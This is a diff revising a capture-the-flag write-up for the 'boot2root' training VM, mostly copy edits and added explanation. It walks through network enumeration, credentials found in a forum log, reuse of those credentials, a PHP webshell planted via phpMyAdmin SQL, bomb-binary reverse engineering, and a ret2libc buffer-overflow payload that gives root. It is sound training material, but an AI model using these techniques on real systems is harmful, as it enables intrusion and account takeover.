@@ -17,9 +17,11 @@ vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-*inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255* gives us the IP address of the virtual machine.
+*inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255* gives us the range of IP addresses that thr virtual machine could be in.
 
-Now we got this, we can use **nmap** to map the network and find out which ports are open. Exploring the network will permit us to find potential vulnerabilities that will help us become root. 
+To find the actual IP of the boot2root VM, we can do `nmap 192.168.56.1-255`. If will check all the IP addresses in that range until it finds one that responds.
+
+Now that we have the IP, we can use **nmap** to map the network and find out which ports are open. Exploring the network will permit us to find potential vulnerabilities that will help us become root. 
 
 The exact command we use is `nmap -sV <TARGET IP ADDRESS>`
 
@@ -60,27 +62,27 @@ Nmap done: 256 IP addresses (2 hosts up) scanned in 17.45 seconds
 Now that we have a detailed description of the target network, we should look for known vulnerabilities for each service and each version of the service. To do so, we can use **exploit-db** and **github**, two useful resources in  infosec. 
 
 - **FTP**: 
-	- FTP sends **data unencrypted**. If we intercept the network traffic, we can read, modify, or steal files and passwords.
-	- Using **hydra** and knowing a username, we can **brute force** the according password if the password policy is weak.
+	- FTP sends **unencrypted data**. If we intercept the network traffic, we can read, modify, or steal files and passwords.
+	- Using **hydra** and knowing a username, we can **brute force** that password if the password policy is weak.
 	- If the server is **misconfigured**, we can sometimes access some files using the username `anonymous` and a blank password.
 - **SSH**:
 	- Thanks to the [**CVE2018-15473**](https://github.com/Sait-Nuri/CVE-2018-15473) (*# OpenSSH 2.3 < 7.7 - Username Enumeration*), we know that the server gave different response for a valid or an invalid username.
-	- In the same idea as for a ftp server, using **hydra** and knowing a username, we can try to **brute force** the according password.
+	- In the same idea as for a ftp server, using **hydra** and knowing a username, we can try to **brute force** the password.
 - **HTTP/S**:
 	- ***SQL Injection*** 
-		- Injection allows an attacker to alter backend SQL statement by manipulating the user supplied data. It occurs when the user input is not properly sanitized and sent to interpreter as part of command and trick the interpreter into executing unintended commands and gives access to unauthorized data. 
-		- It can lead to multiple implication. An attacker can inject malicious content into the vulnerable fields. If so, sensitive data like usernames, passwords, etc. can be read from the database. More over database data can be modified (insert/update/delete).
+		- Injection allows an attacker to alter backend SQL statement by manipulating the user supplied data. It occurs when the user input is not properly sanitized and sent to the interpreter as part of a command to trick the interpreter into executing unintended commands, which gives access to unauthorized data. 
+		- It can lead to multiple implications. An attacker can inject malicious content into the vulnerable fields. If so, sensitive data like usernames, passwords, etc. can be read from the database. More over, database data can be modified (insert/update/delete).
 
 	-  ***Cross Site (XSS)***
-		- XSS target scripts embedded in a page that are executed on the client side rather then at the server side. It occurs when the application takes untrusted data and send it to the web browser  without proper validation. 
-		- The attacker can use this vulnerability to execute malicious code scripts via the browser. Since the latter can't know if the script is trusty or not, it will execute it. The attacker can hijack session cookies, deface the vulnerable website or even redirect the user to an unwanted and malicious sites.
+		- XSS target scripts embedded in a page that are executed on the client side rather then on the server side. It occurs when the application takes untrusted data and sends it to the web browser without proper validation. 
+		- The attacker can use this vulnerability to execute malicious code scripts via the browser. Since the latter can't know if the script is trustworthy or not, it will execute it. The attacker can hijack session cookies, deface the vulnerable website or even redirect the user to an unwanted and malicious sites.
 		
 	-  ***Broken Authentication***
-		- When a user website session is ended, either by logout or browser closed abruptly, the corresponding session cookie and session ID should be invalidated. Each session should have a new cookie, indeed cookies contain sensitive data, like username, password, etc.. If cookies are not invalidated, the sensitive data will remain on the system.
-		- If an attacker find that kind of vulnerabilities, he could gain access to another user's account, using a brute force attack, the use of weak credentials or a weak session cookies.
+		- When a user website session is ended, either by logging out or the browser closing abruptly, the corresponding session cookie and session ID should be invalidated. Each session should have a new cookie: indeed, cookies contain sensitive data, like username, password, etc.. If cookies are not invalidated, the sensitive data will remain on the system.
+		- If an attacker finds that kind of vulnerability, he could gain access to another user's account, using a brute force attack, the use of weak credentials or a weak session cookies.
 		
 	-  ***Broken Access Control (IDOR)***
-		- Some website's pages should be hidden from regular visitors. For instance, only the admin user should have access to a page that access others users. In the same idea, user should not have access to the account of other users. If so, it's a broken access control vulnerability. A regular user could access sensitive data from other regular users and access unauthorized functionalities.
+		- Some websites' pages should be hidden from regular visitors. For instance, only the admin user should have access to a page that accesses others users' information. In the same idea, a user should not have access to the account of other users. If so, it's a broken access control vulnerability. A regular user could access sensitive data about other regular users and access unauthorized functionalities.
 		
 	-  ***Security Misconfiguration***
 		- Misconfiguration of permissions on cloud services.
@@ -89,7 +91,7 @@ Now that we have a detailed description of the target network, we should look fo
 		- Overly detailed error messages giving critical system information to the attackers. 
 	-  ***Security Misconfiguration***
 		- A cryptographic failure is a vulnerability that happens when a cryptographic algorithm protecting sensitive information is misused (or worse, nonexistent). This vulnerability often cause web application divulging sensitive data, as customers data (names, dates of birth, financial information) or technical data such as usernames and passwords.
-		- For instance, when you accessing a banking application via your browser, you wanna be sure that the communication between the client (your browser) and the server is encrypted. If it's not the case, an attacker could capture your network packets, and see your data plain-text, capturing sensitive information about you and your financial data.
+		- For instance, when you access a banking application via your browser, you want to be sure that the communication between the client (your browser) and the server is encrypted. If that's not the case, an attacker could capture your network packets and see your data as plain-text, capturing sensitive information about you and your financial data.
 		
 -  **SSL/IMAP**: 
 	- Internet Message Access Protocol enables user to access their email messages remotely through an internet connection. In substance, emails are kept on a server and not (always) stored on personal device. 
@@ -97,7 +99,7 @@ Now that we have a detailed description of the target network, we should look fo
 
 ## Service Information:
 
-Following the nmap scan, we know that the following ports are open, we also know the version of the service their running.
+Following the nmap scan, we know that the following ports are open, we also know the version of the service they're running.
 
 - **FTP Service (Port 21):** vsftpd 2.0.8 or later
 - **SSH Service (Port 22):** OpenSSH 5.9p1 Debian 5ubuntu1.7
@@ -113,33 +115,7 @@ Following the nmap scan, we know that the following ports are open, we also know
 
 Since the ports 80 and 443 are opened, we can brute force directories using **gobuster**.
 - -dir stands for directory, meaning we want to scan directories
-- -k means that we want to skip the ssl verification (this flag will be useful when brute forcing the htpps server)
-```
-┌──(kali㉿kali)-[~]
-└─$ gobuster dir --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url=192.168.56.103    
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.56.103
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/forum                (Status: 403) [Size: 287]
-/fonts                (Status: 301) [Size: 316] [--> http://192.168.56.103/fonts/]
-/server-status        (Status: 403) [Size: 295]
-Progress: 220560 / 220561 (100.00%)
-===============================================================
-Finished
-===============================================================
-
-```
+- -k means that we want to skip the ssl verification (this flag will be useful when brute forcing the https server)
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -170,7 +146,7 @@ Finished
 
 #### **Step 2 - /forum**
 
-That first page gives us several logins:
+Visiting that first page, `https://192.168.56.103/forum`, gives us several usernames:
 - quedevide
 - thor
 - wandre
@@ -178,15 +154,15 @@ That first page gives us several logins:
 - zaz
 - admin
  
-On the first page there's a post called **Probleme Login ?** by **lmezard**. Sounds interesting. Looking closely, we see this : ```Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2```.  The end of the line mention ssh daemon, let's try to connect through ssh with the credentials we've just found. Unfortunately it doesn't work. However those credentials give us access to the account of lmezard.
+On the first page, there's a post called **Probleme Login ?** by **lmezard**. Sounds interesting. Looking closely, we see this : ```Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2```.  The end of the line mentions ssh daemon, let's try to connect through ssh with the credentials we've just found. Unfortunately, it doesn't work. However, those credentials give us access to the forum account of lmezard.
 
 #### **Step 3 - lmezard account**
  
-Once connected to the forum with the following credentials `lmezard | !q\]Ej?*5K5cy*AJ` we can access the user area, where we discover the email address (an thus the first name) of lmezard **laurie@borntosec.net**.
+Once connected to the forum with the following credentials `lmezard | !q\]Ej?*5K5cy*AJ`, we can access the user area, where we discover the email address (and thus, the first name) of lmezard **laurie@borntosec.net**.
 
 #### **Step 4 - laurie email account**
 
-Since we got an email, we can visit **/webmail** and try to access the account of laurie with the password we found on the forum. Luckily it works. Reading her email, we find this: 
+Since we got an email, we can visit **/webmail** and try to access laurie's account with the password we found on the forum. Luckily, it works. Reading her email, we find this: 
 
 ```
 From: qudevide@mail.borntosec.net
@@ -203,7 +179,7 @@ This email is pretty useful as it contains credentials to access the database: `
 
 #### **Step 5 - /phpmyadmin**
 
-Once connected on php my admin, we have access to the database, we can modify it, delete or even add thing. We could try to change the password of the admin in order to try to login on his user area on the forum. To do so we can go to the  `forum_db -> mlf2_userdata`, and edit **admin**. Password are hashed, let's hash (md5) a password of our choice, and try to connect on the forum. The hash of `adminpwd` is `0a14de5a76e5e14758b04c209f266726`. We change the current hash by this new one, and connect to the admin account. We now have access to a bunch of new functionalities. Unfortunately none of them will be useful except maybe the email listing of the registered users.
+Once connected on phpmyadmin, we have access to the database, which means that we can modify it, delete or even add something. We could try to change the password of the admin in order to try to login on his user area on the forum. To do so we can go to the `forum_db -> mlf2_userdata`, and edit **admin**. Password are hashed, let's hash (md5) a password of our choice, and try to connect on the forum. The hash of `adminpwd` is `0a14de5a76e5e14758b04c209f266726`. We replace the current hash with this new one, and connect to the admin account. We now have access to a bunch of new functionalities. Unfortunately, none of them will be useful except maybe the email listing of the registered users.
 - admin@borntosec.net
 - qudevide@borntosec.net
 - thor@borntosec.net
@@ -215,14 +191,14 @@ Once connected on php my admin, we have access to the database, we can modify it
 
 MySQL database can sometimes being vulnerable to SQL Injection to execute arbitrary commands. 
 	
-An SQL Injection allows an attacker to  add logical expressions and additional commands to an existing SQL Query. It's possible when the user input data in not properly validated by an application. For instance :
+An SQL Injection allows an attacker to add logical expressions and additional commands to an existing SQL Query. It's possible when the user inputs data in not properly validated by an application. For instance :
 ```$sql_query = "select * from users where user='$user' and password='$pass'"``` is used to validate user login requests. If the user submitted data is not properly sanitized, it's possible to pass through the login step with specially crafted values. For example, if we change the value '$user' by **'admin' or '1'='1'**, the attacker we pass the login screen because **or '1'='1'** is always true, ignoring the value of the password.
 
-Using that technique we can writing arbitrary files, reading arbitrary files or even get a **webshell**.
+Using that technique we can start writing arbitrary files, reading arbitrary files or even get a **webshell**.
 
 Navigating through **/myphpadmin**, we notice clicking on the tab **SQL** that we can run a sql query on the server.
 
-Let's craft our webshell. First we have to find a directory with write permission in order to create a file, in this case a webshell php script. Let's try the common ones (temporary directories used by popular CMS) :
+Let's craft our webshell. First we have to find a directory with write permissions in order to create a file, in this case a webshell php script. Let's try the common ones (temporary directories used by popular CMS) :
 
 	-   https://192.168.56.103/forum/templates_compiled/
 	-   https://192.168.56.103/forum/templates_c/
@@ -249,7 +225,7 @@ Altogether we have:
 
 We can now access our webshell using this url : **https://192.168.56.103/forum/templates_c/php_shell.php**
 
-To execute command, we can append `?cmd=CMD` to the url, keeping in my it has to be formatted for an url, we can then use a url encoder to have the right format.
+To execute a command, we can append `?cmd=CMD` to the url, keeping in mind it has to be formatted for an url (we can then use a url encoder to have the right format.)
 
 First, let's see where we are:
 
@@ -277,7 +253,7 @@ The content of **password** is finally displayed. We got `lmezard:G!@M6f4Eatau{s
 
 #### **Step 7 - FTP**
 
-We know that the ports 21 and 22 are open. Those ports run respectively a ftp server and an ssh server. The credentials `lmezard | G!@M6f4Eatau{sF"` gives us access to the session of lmezard on the VM and on the ftp, but not on ssh. 
+We know that the ports 21 and 22 are open. Those ports run respectively a ftp server and an ssh server. The credentials `lmezard | G!@M6f4Eatau{sF"` gives us access to lmezard's session on the VM and on the ftp, but not on ssh. 
 
 On the boot2root session we find 2 interesting files, one called README, telling us that we should complete a challenge to obtain the password of 'laurie' in order to connect via ssh, and the other one seems to list pcap files. It will be difficult for us to complete the challenge directly on the VM. 
 
@@ -380,9 +356,9 @@ In this case, a good start would have been to directly use the command `file`.
 fun: POSIX tar archive (GNU)
 ```
 
-We decompress the archive with the command `tar -xf fun -C .`. We now have a directory named **ft_fun** containing  a lot of pcap files. Unfortunately, (I don't really know why), wireshark refuses to open them.
+We decompress the archive with the command `tar -xf fun -C .`. We now have a directory named **ft_fun** containing  a lot of pcap files. Unfortunately, wireshark refuses to open them because they aren't really .pcap files.
 
-We've seen in the pseudo main that there's a function `getme` which seems responsible to get the characters we're looking for. We try to grep `getme` with the .pcap files we have.
+We've seen in the pseudo main that there's a function `getme` which seems to be responsible for getting the characters we're looking for. We try to grep `getme` with the .pcap files we have.
 
 ```
 ┌──(kali㉿kali)-[~/ft_fun]
@@ -455,7 +431,7 @@ We have what we were looking for, we now know that the first character of the pa
  
 #### **Step 9 - SSH (laurie)**
 
-We connect to ssh with those credentials : `laurie | 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`. Once again we have two files, a README and a binary called **bomb**.
+We connect to ssh with those credentials: `laurie | 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`. Once again, we have two files: a README and a binary executable file called **bomb**.
 
 The README contains this :
 
@@ -596,9 +572,13 @@ End of assembler dump.
 ```
 We notice that we have 6 phases, there's a `readline` taking the user input, if the input is correct we jump to the next phase, if the not the bomb blows up. 
 
+Let's leave GDB behind for now and do static code analysis with Ghidra. Ghidra can also translate assembly code into C, which will be more readable for us.
+
 **PHASE 1**: 
 
-```
+Let's take a look at the phase_1 with Ghidra:
+
+```C
 void phase_1(undefined4 param_1)
 
 {
@@ -616,7 +596,7 @@ The answer of this phase is pretty obvious : **Public speaking is very easy.**.
 
 **PHASE 2**:
 
-```
+```C
 void phase_2(undefined4 param_1)
 
 {
@@ -637,9 +617,9 @@ void phase_2(undefined4 param_1)
   return;
 }
 ```
-We can suppose that the answer will be six numbers. The first if statement learns us the first number should be a **1**. As for the do while loop, we can read that the values in our number's array times the index + 1 should be equaled to the next value in the array. That gives us:
+We can suppose that the answer will be six numbers. The first if statement shows us that the first number should be a **1**. As for the do while loop, we can see that the values in our number's array times the index + 1 should be equal to the next value in the array. That gives us:
 
-```
+```C
 -> i = 0 | array[0] = 1
 array[i] = 1
 array[i] * i + 1 = array[i + 1] <=> array[0] * 2 = 2
@@ -668,7 +648,7 @@ Thus, the answer for the phase 2 is: **1 2 6 24 120 720**
 
 **PHASE 3**:
 
-```
+```C
 void phase_3(char *param_1)
 
 {
@@ -752,7 +732,7 @@ It worth noting that every combination of the switch statement gives us access t
 
 **PHASE 4**:
 
-```
+```C
 void phase_4(char *param_1)
 
 {
@@ -788,54 +768,43 @@ int func4(int param_1)
 }
 ```
 
-So far, the only thing we know is that we have to find an int, when passed to the function `func4` the return of this latter should be equal to 55 (0x37 or '7').
+So far, the only thing we know is that we have to find an int, when passed to the function `func4` the return of this latter should be equal to 0x37 (or 55 decimal).
 
-Let's rewrite those two in c.
+Digging a little further, we can understand that `func4` is a recursive function that calculates the Fibonacci sequence, which is defined as:
+- func4(0) = 1
+- func4(1) = 1
+- func4(n) = func4(n-1) + func4(n-2) for n >= 2
 
-```
-int func4(int nb) {
+This means that we have to determine the smallest integer n such that the nth Fibonacci number is 55.
 
-        int var1;
-        int var2;
-        if (nb < 2) {
+To do this, we can go through the Fibbonacci numbers iteratively in a small python script:
 
-                var2 = 1;
-        }
-        else {
-                var1 = func4(nb - 1);
-                var2 = func4(nb - 2);
-                var2 += var1;
-        }
-        return (var2);
-}
+```python
+def fibonacci(n):
+    if n == 0 or n == 1:
+        return 1
+    a, b = 1, 1
+    for _ in range(2, n + 1):
+        a, b = b, a + b
+    return b
 
-void phase_4(void) {
-
-        int v1;
-        int v2;
-        v1 = scanf("%d", &v2);
-        if (v1 != 1 || v2 < 1)
-        {
-                printf("error len %d\n", v1);
-                printf("%d is FALSE\n", v2);
-                return;
-        }
-        v1 = func4(v2);
-        if (v1 != 0x37) 
-        {
-                printf("%d is FALSE\n", v2);
-                return;
-        }
-        printf("%d is the right number\n", v2);
-        return;
-}
+def find_phase_4_solution():
+    target_value = 0x37 # = 55 in decimal
+    n = 0
+    while True:
+        fib_n = fibonacci(n)
+        if fib_n == target_value:
+            return n
+        elif fib_n > target_value:
+            return None
+        n += 1
 ```
 
-Trying the program with different values, we finally find the one, **9**
+If we pass a `target_value` of 55 to our function, we get the answer **9**.
 
 **PHASE 5**:
 
-```
+```C
 void phase_5(int param_1)
 
 {
@@ -861,11 +830,13 @@ void phase_5(int param_1)
 }
 ```
 
-Further exploration in Ghidra gives us one more clue, `array.123` value is `"isrveawhobpnutfg"`. It looks like we have a kind of corresponding table.
+Our goal here is to find a string of 6 characters that maps to the string "giants".
 
-Rewriting this code, we got :
+Further exploration in Ghidra gives us one more clue, `array.123` value is `"isrveawhobpnutfg"`. It looks like we have a kind of lookup table.
 
-```
+Rewriting this code, we get :
+
+```C
 void phase_5() {
         char line[6];
         char *key = "giants";
@@ -888,17 +859,38 @@ void phase_5() {
 }
 ```
 
-The program gives us four possibilities, 
+In Python, we can solve it this way:
+```python
+lookup_table = "isrveawhobpnutfg"
+
+def find_phase_5_solution():
+    target = "giants"
+    possible_solutions = [[] for _ in range(6)]
+
+    # Collect all possible characters for each position in the target string
+    for i in range(6):
+        for c in range(ord('a'), ord('z') + 1):
+            transformed_char = lookup_table[c & 0xf]
+            if transformed_char == target[i]:
+                possible_solutions[i].append(chr(c))
+
+    # Generate all permutations of possible solutions
+    # with itertools carthesian product of iterables
+    all_solutions = list(product(*possible_solutions))
+    return [''.join(solution) for solution in all_solutions]
+```
+
+Either way, the program gives us four possibilities, 
 	- `opekmq`
 	- `opekma`
 	- `opukma`
 	- `opukmq`
 
-Like for the phase 3, we'll have to find the right combination for the final password.
+Just like in phase 3, any one of these work to pass the phase, but we'll have to find the right combination for the final password.
 
 **PHASE 6**:
 
-```
+```C
 void phase_6(undefined4 param_1)
 
 {
@@ -959,7 +951,9 @@ void phase_6(undefined4 param_1)
 }
 ```
 
-Once again, digging in Ghidra, we notice 6 variables, from node1 to node6. Then, using gdb we got:
+As we can see with the call to the `read_six_numbers()` function, the answer must be a sequence of 6 numbers. We can also see that each one of those six numbers must be between 1 and 6 (inclusive) and there can be no duplicates, otherwise the bomb explodes.
+
+Once again, digging in Ghidra, we notice 6 variables, from node1 to node6. We can't see the values in these variables, though. But if we take a closer look using gdb, we get:
 
 ```
 (gdb) print (int)node1
@@ -976,9 +970,9 @@ $5 = 212
 $6 = 432
 ```
 
-Recall that the last hint is a '4', meaning that the answer begins with a '4' and that the value of each node are not included in the answer, but their index are.
+We'll recall that the last hint in README is a '4', meaning that the answer begins with a '4'. Since the answer is a sequence of 6 numbers between 1 and 6, we know the value of each node is not included in the answer, but the index is.
 
-Intuitively, we can try to order them in descending order (as the fourth node has the biggest value) : `4 2 6 3 1 5`. And it actually works.
+Intuitively, we can try to order them in descending order (since the fourth node has the biggest value) : `4 2 6 3 1 5`. And it actually works.
 
 **RECAP PHASE 6**:
 
@@ -989,7 +983,16 @@ Intuitively, we can try to order them in descending order (as the fourth node ha
 5. `opekmq`
 6. `4 2 6 3 1 5`
 
-Thus, the ssh password `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+If we try this, the password will be wrong. In the Boot2root subject, it is stated that:
+
+```
+For the part related to a (bin) bomb: If the password found is
+123456. The password to use is 123546.
+```
+
+Meaning that we need to invert a couple of digits in the phase 6 answer: `4 2 6 3 1 5` -> `4 2 6 1 3 5`
+
+Thus, the ssh password for user `thor` is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 #### **Step 10 - SSH (thor)**
 
@@ -1088,13 +1091,20 @@ t.forward(100)
 t.backward(200)
 
 ```
-We can test this script on this [website](https://www.codetoday.co.uk/code). It seems that the word we should find is `SLASH`. The issue is that this password is not the right one to connect with `zaz` via ssh. Reading the last lines of turtle once again, we notice the word `digest`, like in `Message Digest Algorithm 5`. The md5 hash of `SLASH` is `646da671ca01bb5d84dbb5fb2238dc8e`. 
+We can test this script on this [website](https://www.codetoday.co.uk/code). It seems that the word we should find is `SLASH`. The issue is that this password is not the right one to connect with `zaz` via ssh. Reading the last line of turtle once again, we notice the word `digest`, as in `Message Digest Algorithm 5`.
+
+The md5 hash of `SLASH` is:
+```bash
+$ echo -n "SLASH" | md5sum
+646da671ca01bb5d84dbb5fb2238dc8e
+```
 
 #### **Step 11 - SSH (zaz)**
 
 Once connected to zaz via ssh, we discover a directory named `mail` and a binary called `exploit_me`. Unless I am mistaken, the `mail` directory won't be useful this time. Let's have a look at `exploit_me`.
 
-Unfortunately, Ghidra gives us nothing really useful except this:
+Unfortunately, Ghidra gives us nothing really useful, except this:
+
 ```
 bool main(int param_1,int param_2)
 
@@ -1109,7 +1119,7 @@ bool main(int param_1,int param_2)
 }
 ```
 
-.Let's focus on gdb.
+Let's focus on gdb:
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -1151,9 +1161,9 @@ Non-debugging symbols:
 0x080484ec  _fini
 ```
 
-We notice a called to the function `strcpy`. This function is vulnerable to buffer overflow, indeed it takes no parameters specifying the length of the string.
+We notice a call to the function `strcpy`. This function is vulnerable to buffer overflow, indeed it takes no parameters specifying the length of the string.
 
-Testing the binary we see that it echoes on the stdin the argument we give.
+Testing the binary, we see that it echoes the argument we give it to stdout.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -1179,11 +1189,11 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 ```
 
-140 is thus our pivot to exploit the binary. The idea is to trick `exploit_me`, make it print 140 and then give it an address that will point on /bin/sh in order to launch a root shell. This technique is called **ret2libc**. The difference with a basic buffer overflow attack which normally overwrite the return address with the address of a malicious function, is that we overwrite the address of the return function with the address of the `system` libc function. In this case we want the system function to launch `/bin/sh`, more precisely we want `system("/bin/sh")`.
+140 is thus our pivot to exploit the binary. The idea is to trick `exploit_me`, make it print 140 "A"s and then give it an address that will point to `/bin/sh` in order to launch a root shell. This technique is called **ret2libc**. The difference with a basic buffer overflow attack which would normally overwrite the return address with the address of a malicious function, is that we overwrite the address of the return function with the address of the `system` libc function. In this case we want the system function to launch `/bin/sh`, more precisely we want `system("/bin/sh")`.
 
-To do so, let's follow some steps.
+To do so, let's follow these steps.
 
-First, using gdb, we find the address of `system`.
+First, let's find the address of `system` using gdb.
 
 ```
 zaz@BornToSecHackMe:~$ gdb exploit_me 
@@ -1207,7 +1217,7 @@ $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 ```
  The address of exit is `0xb7e5ebe0`.
  
- Now we need the address of the string "/bin.sh". To do so let's find the range of address were is located the libc and search for the string.
+ Now we need the address of the string "/bin.sh". To do so let's find the range of addresses were the libc is located and search for the string.
 
 ```
 (gdb) info proc map
@@ -1234,16 +1244,21 @@ Mapped address spaces:
 ```
 We find the address of "/bin/sh" which is `0xb7f8cc58`.
 
-Let's craft our payload: 
+Let's craft our payload following this structure: 
+
+```
+A * 140 padding | system address | exit address | /bin/sh address
 
 `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
+```
 
-We run `exploit_me` with our payload as argument
+We run `exploit_me` with our payload as argument:
 
 ```
 ./exploit_me `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
 ```
-And we are root!
+
+And we are root! (Prove it with `whoami`!)
 
 ### **Used tools**
 
